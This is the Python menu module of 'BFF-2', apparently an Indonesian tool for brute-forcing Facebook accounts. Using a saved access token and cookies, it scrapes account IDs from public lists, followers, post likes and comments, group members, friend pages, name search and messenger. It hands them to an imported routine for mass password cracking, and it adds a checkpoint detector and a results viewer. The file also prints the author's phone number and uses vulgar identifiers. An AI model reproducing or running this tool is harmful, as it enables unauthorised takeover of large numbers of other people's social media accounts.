# coding=utf-8 

#     *Brute Force Facebook (BFF)²
#     *file name: __init__.py
#     *copyright: (C) © 2022 ~ Romi Afrizal
#     *contact me on whatsap: +6281273018924

#     *Terimakasih sudah decode script ini tolong jangan di perjual belikan :)*
#     *Thanks for decoding this script, please don't sell it :)*
"""

-*- Author: Romi Afrizal  
}------------------------------------->
-*- Note: do not change again! there will be an error, the script is good                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        CODING BY GUWEH ROMI AFRIZAL :v
       
"""
#-------[ DO NOT CHANGE AGAIN ]-------#
from xyz import *
from log.masuk import romz_tzy as masuk
from log.language import bahasa as lang
from romz.banner import Banner as rz
from romz import my_info as inpo
from romz import hasil as lihat
from .dump import romi_afrzl as dumpid 
from xyz import detect as detektor

sys.stdout.write('\x1b[1;35m\x1b]2; {×} bff-2 by romz {×} \x07')
			
#-------[ ORANG GANTENG ]-------#
class romz_xyz_ganteng_banget:
	
	def __init__(self):
		aktiv = "bff"
		expi = "perbarui" 
		self.roomz = requests.Session()
		self.url_giit = "https://raw.githubusercontent.com/Mark-Zuck/Mark-Zuck/main/status/"
		self.url_mb = "https://mbasic.facebook.com"
		self.hapus = "rm -rf data/token.txt && rm -rf data/cookie.txt"
		self.pepek = [
			"romi",
			"Romi",
			"ROMI",
			"Romi Afrizal",
			"romi afrizal",
			"Romi afrizal",
			"ROMI AFRIZAL",
			"romi Afrizal",""
		]
		self.ENG,self.IND = [],[]
		# cek aktif script 
		try:
			bb = open("data/pengguna.txt","r").read()
		except (FileNotFoundError, IOError):
			bb = 'bro'
		try:
			giit = self.roomz.get(self.url_giit+"owner").text.strip()
			got = self.roomz.get(self.url_giit+"update").text.strip()
			tgl = self.roomz.get(self.url_giit+"waktu").text.strip()
			if aktiv == giit:
				pass 
			elif expi == got:
				rz().logo2();print('')
				self.jalan(f"{p}╰─{h} maaf, script sedang diperbarui. \n{p}╰─{h} akan selesai pada {o}{tgl} ");print('')
				self.jalan(f"{p}╰─{h} sorry, script is being updated. \n{p}╰─{h} will finish on {o}{tgl} ");print('')
				exit()
			else:
				rz().logo2()
				print(f"\n{p}╰─{o} hello {h}{bb}{o} i'm sorry \n{p}╰─ {o}script is closing (ditutup),contact the owner \n{p}╰─{o} whatsap{m}:{h} +6281273018924\n")
				exit()
		except Exception as ev:
			os.system("clear")
			exit(f"{p}╰─ {m}ups {ev}")
		# cek bahasa script
		try:
			self.eng = open("data/english.txt","r").read()
			self.indo = open("data/indo.txt","r").read() 
			self.ENG.append(self.eng)
			self.IND.append(self.indo) 
		except (FileNotFoundError, IOError):
			lang()
		# pengguna baru script
		try:
			be = open("data/pengguna.txt","r").read()
		except (FileNotFoundError, IOError, KeyError):
			os.system("clear")
			if "bahasa_inggris" in self.ENG:
				self.jalan(f"{u} •{o} Hey, looks like you're a new user of this script hehe")
				xe = input(f"{u} •{o} What's your name? {h}")
			else:
				self.jalan(f"{u} •{o} Hy seperti nya anda pengguna baru script ini hehe")
				xe = input(f"{u} •{o} Siapa nama kamu? {h}")
			if xe in['']:
				if "bahasa_inggris" in self.ENG:
					exit ("\n%s • don't be empty"%(m));jeda(2)
				else:
					exit ("\n%s • jangan kosong"%(m));jeda(2)
			if "bahasa_inggris" in self.ENG:
				print ('')
				self.jalan(f"{u} •{o} Thank you {h}{xe} {o}for using this script")
				self.jalan(f"{u} •{o} have a nice day :)");print ('')
				self.englix();print ('')
			else:
				print ('')
				self.jalan(f"{u} •{o} Terima kasih {h}{xe} {o}telah menggunakan script ini")
				self.jalan(f"{u} •{o} semoga hari mu menyenangkan :)");print ('')
				self.indox();print ('')
			open("data/pengguna.txt","w").write(xe)
		self.Menu()

	#--- JALAN
	def jalan(self,keliling):
		for mau in keliling + '\n':
			sys.stdout.write(mau)
			sys.stdout.flush();jeda(0.03)
			
	#--- FOLDER
	def folder(self):
		try:os.mkdir('OK')
		except:pass
		try:os.mkdir('CP')
		except:pass
		try:os.mkdir('data')
		except:pass
		
	#--- WAKTU
	def waktu(self):
		now = datetime.now()
		hours = now.hour
		if 00 <= hours < 11:
			if "bahasa_inggris" in self.ENG:
				sapa = "Good morning"
			else:
				sapa = "Selamat pagi"
		elif 11 <= hours < 15:
			if "bahasa_inggris" in self.ENG:
				sapa = "Good afternoon"
			else:
				sapa = "Selamat siang"
		elif 15 <= hours < 18:
			if "bahasa_inggris" in self.ENG:
				sapa = "Good evening"
			else:
				sapa = "Selamat sore"
		elif 18 <= hours < 23:
			if "bahasa_inggris" in self.ENG:
				sapa = "Good night"
			else:
				sapa = "Selamat malam"
		else:
			if "bahasa_inggris" in self.ENG:
				sapa = "Welcome"
			else:
				sapa = "Selamat datang"
				
		return sapa
	
	#--- CONVERT COOKIE DICT TO STRING
	def romz_xyz(self,cookie,venom={}):
		for x in cookie.replace(' ','').strip().split(';'):
			kuki = x.split('=')
			if len(kuki) > 1:
				venom.update({kuki[0]: kuki[1]})
		return venom
		
	#--- MENU PILIHAN 
	def Menu(self):
		self.folder()
		rz().logo()
		try:
			self.token = open("data/token.txt","r").read()
			self.cokis = {"cookie":open("data/cookie.txt","r").read()}
			self.nama = json.loads(self.roomz.get(f'https://graph.facebook.com/me?fields=name,id&access_token={self.token}',cookies=self.cokis).text)["name"] 
		except KeyError:
			os.system (self.hapus)
			if "bahasa_inggris" in self.ENG:
				exit ("%s╰─%s cookie invalid "%(p,m));jeda(2)
			else:
				exit ("%s╰─%s cookie kedaluwarsa "%(p,m));jeda(2)
		except FileNotFoundError:
			if "bahasa_inggris" in self.ENG:
				print ("%s╰─ %syou are not logged in "%(p,m));jeda(2)
			else:
				print ("%s╰─ %sanda belum login "%(p,m));jeda(2)
			os.system (self.hapus)
			masuk()
		except (AttributeError,UnboundLocalError):
			if "bahasa_inggris" in self.ENG:
				exit ("%s╰─ %sthere is an error "%(p,m));jeda(2)
			else:
				exit ("%s╰─ %sterjadi kesalahan "%(p,m));jeda(2)
		except requests.exceptions.ConnectionError as konek:
			if "bahasa_inggris" in self.ENG:
				exit (f"%s╰─%s failed to load no connection: {konek}"%(p,m));jeda(2)
			else:
				exit (f"%s╰─%s gagal memuat tidak ada koneksi: {konek}"%(p,m));jeda(2)
		if "bahasa_inggris" in self.ENG:
			tulis(Panel(f"""{Te}{P} # {O}{self.waktu()} {H}{self.nama} \n
 {U}•{P} 01 {O}Crack from public           {H}on             \n {U}•{P} 02 {O}Crack from followers        {H}on
 {U}•{P} 03 {O}Crack from likes post       {H}on           \n {U}•{P} 04 {O}Crack from coments post     {H}on
 {U}•{P} 05 {O}Crack from members group    {H}on   \n {U}•{P} 06 {O}Crack from requests page    {H}on
 {U}•{P} 07 {O}Crack from search name      {H}on      \n {U}•{P} 08 {O}Crack from messengers       {H}on
 {U}•{P} 09 {O}Checkpoint detektor         {H}on           \n {U}•{P} 10 {O}View crack results    
 {U}•{P} 11 {O}Info about script                                     \n {U}•{P} 12 {O}Change language   
 {U}•{P} rm {O}Clear data login                                      \n {U}•{M} 00 {O}Logout  """,
			title = f'{Te}{M}[ {H}Menu {M}]',style='#FF0022'))
		elif "bahasa_indonesia" in self.IND:
			tulis(Panel(f"""{Te}{P} # {O}{self.waktu()} {H}{self.nama} \n
 {U}•{P} 01 {O}Crack dari daftar teman       {H}on      \n {U}•{P} 02 {O}Crack dari total pengikut     {H}on
 {U}•{P} 03 {O}Crack dari reaction post      {H}on       \n {U}•{P} 04 {O}Crack dari komentar post      {H}on
 {U}•{P} 05 {O}Crack dari anggota group      {H}on     \n {U}•{P} 06 {O}Crack dari halaman teman      {H}on
 {U}•{P} 07 {O}Crack dari pencarian nama     {H}on   \n {U}•{P} 08 {O}Crack dari pesan chatt        {H}on
 {U}•{P} 09 {O}Checkpoint detektor           {H}on         \n {U}•{P} 10 {O}Lihat hasil crack             
 {U}•{P} 11 {O}Info tentang script                                 \n {U}•{P} 12 {O}Ganti bahasa
 {U}•{P} rm {O}Hapus data login                                   \n {U}•{M} 00 {O}Keluar  """,
			title = f'{Te}{M}[ {H}Menu {M}]',style='#FF0022'))
		else:
			kentod = [
				"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
				"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
				"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
				"×"
			]
			for ci in kentod:
				sys.stdout.write(f'\r{m} {ci} ...')
				sys.stdout.flush();jeda(0.2)
			self.jalan (f"{m} yah error :( ");exit()
		if "bahasa_inggris" in self.ENG:
			slut = input('%s╰─ %sSelect %s> %s'%(p,o,m,k))
		else:
			slut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		if slut in['',' ']:
			if "bahasa_inggris" in self.ENG:
				exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
			else:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
				
		elif slut in['1','01']:
			if "bahasa_inggris" in self.ENG:
				gan = input ("%s╰─%s you want bulk crack id? y/t%s >%s "%(p,o,m,k))
			else:
				gan = input ("%s╰─%s anda ingin crack massal id? y/t%s >%s "%(p,o,m,k))
			if gan in['']:
				if "bahasa_inggris" in self.ENG:
					exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
				else:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			elif gan in['y','Y']:
				dumpid(self.token,self.cokis).MassalPublikGRAPH()
			elif gan in['t','T']:
				dumpid(self.token,self.cokis).PublikGRAPH()
			else:
				if "bahasa_inggris" in self.ENG:
					exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
				else:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
								
		elif slut in['2','02']:
			dumpid(self.token,self.cokis).FollowPublikGRAPH()
					
		elif slut in['3','03']:
			if "bahasa_inggris" in self.ENG:
				tulis(Panel(f"{Te}{U} {til}{O} Make sure the facebook post is public ",style='#FF0022'))
				idt = input('%s╰─ %sID post %s> %s'%(p,o,m,k))
			else:
				tulis(Panel(f"{Te}{U} {til}{O} Pastikan postingan facebook publik ",style='#FF0022'))
				idt = input('%s╰─ %sID postingan %s> %s'%(p,o,m,k))
			if idt in[""," "]:
				if "bahasa_inggris" in self.ENG:
					exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
				else:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				try:
					dumpid(self.token,self.cokis).postingan(f"{self.url_mb}/ufi/reaction/profile/browser/?ft_ent_identifier={idt}")
				except KeyError:
					if "bahasa_inggris" in self.ENG:
						exit ('%s╰─%s failed to retrieve ID, please try again'%(p,m));jeda(2)
					else:
						exit ('%s╰─%s gagal mengambil ID'%(p,m));jeda(2)
									
		elif slut in['4','04']:
			if "bahasa_inggris" in self.ENG:
				tulis(Panel(f"{Te}{U} {til}{O} Make sure the facebook post is public ",style='#FF0022'))
				idt = input('%s╰─ %sID post %s> %s'%(p,o,m,k))
			else:
				tulis(Panel(f"{Te}{U} {til}{O} Pastikan postingan facebook publik ",style='#FF0022'))
				idt = input('%s╰─ %sID postingan %s> %s'%(p,o,m,k))
			if idt in[""," "]:
				if "bahasa_inggris" in self.ENG:
					exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
				else:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				try:
					dumpid(self.token,self.cokis).komentar(f"{self.url_mb}/{idt}")
				except KeyError:
					if "bahasa_inggris" in self.ENG:
						exit ('%s╰─%s failed to retrieve ID, please try again'%(p,m));jeda(2)
					else:
						exit ('%s╰─%s gagal mengambil ID, harap coba lagi'%(p,m));jeda(2)
									
		elif slut in['5','05']:
			if "bahasa_inggris" in self.ENG:
				tulis(Panel(f"{Te}{U} {til}{O} Make sure the group is public / you join the group ",style='#FF0022'))
				idt = input('%s╰─ %sID group %s> %s'%(p,o,m,k))
			else:
				tulis(Panel(f"{Te}{U} {til}{O} Pastikan group publik / anda bergabung dlm grup ",style='#FF0022'))
				idt = input('%s╰─ %sID group %s> %s'%(p,o,m,k))
			if idt in[""," "]:
				if "bahasa_inggris" in self.ENG:
					exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
				else:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				try:
					response = self.roomz.get(f"{self.url_mb}/browse/group/members/?id={idt}",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
					if "Halaman Tidak Ditemukan" in response:
						if "bahasa_inggris" in self.ENG:
							exit('%s╰─%s group not found'%(p,m))
						else:
							exit('%s╰─%s group tidak di temukan'%(p,m))
					elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in response:
						if "bahasa_inggris" in self.ENG:
							exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
						else:
							exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					elif "Konten Tidak Ditemukan" in response:
						if "bahasa_inggris" in self.ENG:
							exit('%s╰─%s group not found'%(p,m))
						else:
							exit('%s╰─%s group tidak di temukan'%(p,m))
					else:
						#print (f"{p}╰─{o} Nama group {m}>{k} "+re.findall("\<title\>(.*?)<\/title\>",response)[0][8:])
						dumpid(self.token,self.cokis).groups(f"{self.url_mb}/browse/group/members/?id={idt}")
				except requests.exceptions.ConnectionError: 
					if "bahasa_inggris" in self.ENG:
						exit('%s╰─%s no connection%s\n'%(p,m,n))
					else:
						exit('%s╰─%s tidak ada koneksi%s\n'%(p,m,n))
								
		elif slut in['6','06']:
			if "bahasa_inggris" in self.ENG:
				tulis(Panel(f"""{Te} {U}•{P} 01 {O}Friend's suggestions 
 {U}•{P} 02 {O}Friend request
 {U}•{P} 03 {O}Request sent """,
				title = f'{Te}{M}[ {H}Requests page {M}]',style='#FF0022'))
			else:
				tulis(Panel(f"""{Te} {U}•{P} 01 {O}Saran teman
 {U}•{P} 02 {O}Permintaan pertemanan
 {U}•{P} 03 {O}Permintaan terkirim """,
				title = f'{Te}{M}[ {H}Halaman teman {M}]',style='#FF0022'))
			if "bahasa_inggris" in self.ENG: 
				tmn = input('%s╰─ %sSelect %s> %s'%(p,o,m,k))
			else:
				tmn = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
			if tmn in['']:
				if "bahasa_inggris" in self.ENG: 
					exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
				else:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			elif tmn in['1','01']:
				try:
					ajg = self.roomz.get(f"{self.url_mb}/friends/center/suggestions",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
					if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
						if "bahasa_inggris" in self.ENG:
							exit('%s╰─%s account is spammed, try again later'%(p,m))
						else:
							exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					else:
						if "bahasa_inggris" in self.ENG: 
							jumlah=int(input('%s╰─ %stotal users %s> %s'%(p,o,m,k)))
							if "90000" in str(jumlah):
								jumlah-=1
							if jumlah<90001:
								dumpid(self.token,self.cokis).saran(f"{self.url_mb}/friends/center/suggestions",jumlah)
							else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
						else:
							jumlah=int(input('%s╰─ %sjumlah users %s> %s'%(p,o,m,k)))
							if "90000" in str(jumlah):
								jumlah-=1
							if jumlah<90001:
								dumpid(self.token,self.cokis).saran(f"{self.url_mb}/friends/center/suggestions",jumlah)
							else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					if "bahasa_inggris" in self.ENG:
						exit ("%s╰─%s no connection "%(p,m));jeda(2)
					else:
						exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
				except ValueError:
					if "bahasa_inggris" in self.ENG:
						exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
					else:
						exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			elif tmn in['2','02']:
				try:
					ajg = self.roomz.get(f"{self.url_mb}/friends/center/requests",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
					if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
						if "bahasa_inggris" in self.ENG:
							exit('%s╰─%s account is spammed, try again later'%(p,m))
						else:
							exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					else:
						if "bahasa_inggris" in self.ENG: 
							jumlah=int(input('%s╰─ %stotal users %s> %s'%(p,o,m,k)))
							if "90000" in str(jumlah):
								jumlah-=1
							if jumlah<90001:
								dumpid(self.token,self.cokis).tmann(f"{self.url_mb}/friends/center/requests",jumlah)
							else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
						else:
							jumlah=int(input('%s╰─ %sjumlah user %s> %s'%(p,o,m,k)))
							if "90000" in str(jumlah):
								jumlah-=1
							if jumlah<90001:
								dumpid(self.token,self.cokis).tmann(f"{self.url_mb}/friends/center/requests",jumlah)
							else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					if "bahasa_inggris" in self.ENG:
						exit ("%s╰─%s no connection "%(p,m));jeda(2)
					else:
						exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
				except ValueError:
					if "bahasa_inggris" in self.ENG:
						exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
					else:
						exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			elif tmn in['3','03']:
				try:
					ajg = self.roomz.get(f"{self.url_mb}/friends/center/requests/outgoing",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
					if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
						if "bahasa_inggris" in self.ENG:
							exit('%s╰─%s account is spammed, try again later'%(p,m))
						else:
							exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					else:
						if "bahasa_inggris" in self.ENG: 
							jumlah=int(input('%s╰─ %stotal users %s> %s'%(p,o,m,k)))
							if "90000" in str(jumlah):
								jumlah-=1
							if jumlah<90001:
								dumpid(self.token,self.cokis).saran(f"{self.url_mb}/friends/center/requests/outgoing",jumlah)
							else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
						else:
							jumlah=int(input('%s╰─ %sjumlah users %s> %s'%(p,o,m,k)))
							if "90000" in str(jumlah):
								jumlah-=1
							if jumlah<90001:
								dumpid(self.token,self.cokis).saran(f"{self.url_mb}/friends/center/requests/outgoing",jumlah)
							else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					if "bahasa_inggris" in self.ENG:
						exit ("%s╰─%s no connection "%(p,m));jeda(2)
					else:
						exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
				except ValueError:
					if "bahasa_inggris" in self.ENG:
						exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
					else:
						exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				if "bahasa_inggris" in self.ENG: 
					exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
				else:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
							
		elif slut in['7','07']:
			if "bahasa_inggris" in self.ENG:
				tulis(Panel(f'{Te}{U} •{O} example{M} >{O} romi afrizal',style='#FF0022'))
				kontol = input('%s╰─ %sname of the person %s> %s'%(p,o,m,k))
			else:
				tulis(Panel(f'{Te}{U} •{O} contoh{M} >{O} romi afrizal',style='#FF0022'))
				kontol = input('%s╰─ %snama orang %s> %s'%(p,o,m,k))
			if kontol in self.pepek:
				if "bahasa_inggris" in self.ENG:
					exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
				else:
					exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			else:
				try:
					ajg = self.roomz.get(f"{self.url_mb}/search/people/?q={kontol}",cookies=self.romz_xyz(open("data/cookie.txt","r").read().strip())).text 
					if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in ajg:
						if "bahasa_inggris" in self.ENG:
							exit('%s╰─%s account is spammed, try again later'%(p,m))
						else:
							exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					elif "Anda Diblokir Sementara" in ajg:
						if "bahasa_inggris" in self.ENG:
							exit('%s╰─%s account is spammed, try again later'%(p,m))
						else:
							exit('%s╰─%s akun terkena spam coba beberapa saat lagi'%(p,m))
					else:
						if "bahasa_inggris" in self.ENG:
							jumlah=int(input('%s╰─ %stotal users %s> %s'%(p,o,m,k)))
							if "90000" in str(jumlah):
								jumlah-=1
							if jumlah<90001:
								dumpid(self.token,self.cokis).search_name(f"{self.url_mb}/search/people/?q={kontol}",jumlah)
							else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
						else:
							jumlah=int(input('%s╰─ %sjumlah user %s> %s'%(p,o,m,k)))
							if "90000" in str(jumlah):
								jumlah-=1
							if jumlah<90001:
								dumpid(self.token,self.cokis).search_name(f"{self.url_mb}/search/people/?q={kontol}",jumlah)
							else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					if "bahasa_inggris" in self.ENG:
						exit ("%s╰─%s no connection "%(p,m));jeda(2)
					else:
						exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
				except ValueError:
					if "bahasa_inggris" in self.ENG:
						exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
					else:
						exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
									
		elif slut in['8','08']:
			if "bahasa_inggris" in self.ENG:
				tulis(Panel(f"{Te}{U} {til}{O} Crack from facebook massenger ",style='#FF0022'))
			else:
				tulis(Panel(f"{Te}{U} {til}{O} Crack dari pesan massenger ",style='#FF0022'))
			try:
				dumpid(self.token,self.cokis).pesan(f"{self.url_mb}/messages")
			except KeyError:
				if "bahasa_inggris" in self.ENG:
					exit ('%s╰─%s failed to retrieve ID, please try again'%(p,m));jeda(2)
				else:
					exit ('%s╰─%s gagal mengambil ID, harap coba lagi'%(p,m));jeda(2)
			except requests.exceptions.ConnectionError:
				if "bahasa_inggris" in self.ENG:
					exit ("%s╰─%s no connection "%(p,m));jeda(2)
				else:
					exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
						
		elif slut in['9','09']:
			detektor.file_cp(self.ENG)
			
		elif slut in['10']:
			lihat.hasil_fb(self.ENG)
				
		elif slut in['11']:
			inpo.ingfoh(self.ENG)
			
		elif slut in['12']:
			lang()
				
		elif slut in['rm','RM','Rm']:
			os.system(self.hapus);print('')
			rz().loads()
			if "bahasa_inggris" in self.ENG:
				self.jalan('%s successfully deleted '%(m));exit()
			else:
				self.jalan('%s berhasil terhapus '%(m));exit()
				
		elif slut in['0','00']:
			if "bahasa_inggris" in self.ENG:
				self.jalan('%s╰─%s Good bye bro :) '%(p,h));exit()
			else:
				self.jalan('%s╰─%s Sampai jumpa tod :) '%(p,h));exit()

		else:
			if "bahasa_inggris" in self.ENG:
				exit ('%s╰─%s choose the right one'%(p,m));jeda(2)
			else:
				exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
			
	#--- BUAT PELENGKAP AJA :v
	def ComingSoon(self):
		if "bahasa_inggris" in self.ENG: 
			self.jalan ("%s╰─ %sMenu not yet available... "%(p,o));exit()
		else:
			self.jalan ("%s╰─ %sMenu belum tersedia... "%(p,o));exit()
	
	#--- LOADING
	def indox(self):
		kentod = [
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"√"
		]
		for ci in kentod:
			sys.stdout.write(f'\r{p}╰─{o} mohon tunggu ... {h}{ci}')
			sys.stdout.flush();jeda(0.06)
			
	def englix(self):
		kentod = [
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"√"
		]
		for ci in kentod:
			sys.stdout.write(f'\r{p}╰─{o} please wait ... {h}{ci}')
			sys.stdout.flush();jeda(0.06)
	
"""

    Biar apa sih di decompile anyink
    Taekkk !
    
"""